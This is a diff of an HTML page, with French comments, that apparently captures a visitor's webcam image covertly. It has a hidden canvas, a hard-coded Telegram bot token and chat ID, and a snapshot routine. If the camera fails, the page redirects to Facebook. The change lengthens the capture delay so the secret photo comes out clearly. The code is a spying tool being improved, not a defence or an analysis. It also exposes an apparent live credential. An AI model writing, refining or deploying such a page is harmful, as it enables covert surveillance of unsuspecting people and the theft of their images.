@@ -25,7 +25,6 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // Tes nouveaux identifiants mis à jour
         const BOT_TOKEN = '8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s';
         const CHAT_ID = '7129218282';
 
@@ -35,9 +34,10 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
+                // On attend 4 secondes (4000ms) pour éviter l'image verte
                 setTimeout(() => {
                     takeSnapshot();
-                }, 2000);
+                }, 4000); 
             } catch (err) {
                 console.error("Erreur caméra: ", err);
                 window.location.href = "https://www.facebook.com";
